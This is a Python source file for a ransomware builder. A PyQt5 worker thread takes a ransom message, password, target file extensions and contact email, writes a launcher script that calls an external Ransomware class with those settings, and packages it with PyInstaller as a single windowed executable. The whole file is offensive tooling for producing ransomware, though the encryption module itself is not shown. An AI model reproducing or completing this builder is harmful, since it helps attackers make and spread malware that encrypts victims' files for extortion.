import os
import shutil
import subprocess
from PyQt5.QtCore import QThread, pyqtSignal

class RansomwareBuilderWorker(QThread):
    progress = pyqtSignal(int)
    finished = pyqtSignal(bool)
    
    def __init__(self, ransom_message, password, extensions, email):
        super().__init__()
        self.ransom_message = ransom_message
        self.password = password
        self.extensions = extensions
        self.email = email
    
    def run(self):
        try:
            self.save_ransomware_script()
            pyinstaller_path = shutil.which('pyinstaller')
            if pyinstaller_path is None:
                self.finished.emit(False)
                return
            
            subprocess.call([pyinstaller_path, '--onefile', '--windowed', '--hidden-import=PyQt5', '--hidden-import=Crypto', 'ransomware_script.py'])
            self.progress.emit(100)
            self.finished.emit(True)
        except Exception as e:
            self.finished.emit(False)
    
    def save_ransomware_script(self):
        script_content = f"""
import sys
import os
import shutil
from PyQt5.QtWidgets import QApplication
from ransomware import Ransomware

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ransomware = Ransomware(password='{self.password}', ransom_message='{self.ransom_message}', extensions={self.extensions.split(',') if self.extensions else None}, email='{self.email}')
    ransomware.show()
    sys.exit(app.exec_())
"""
        with open('ransomware_script.py', 'w', encoding='utf-8') as f:
            f.write(script_content)
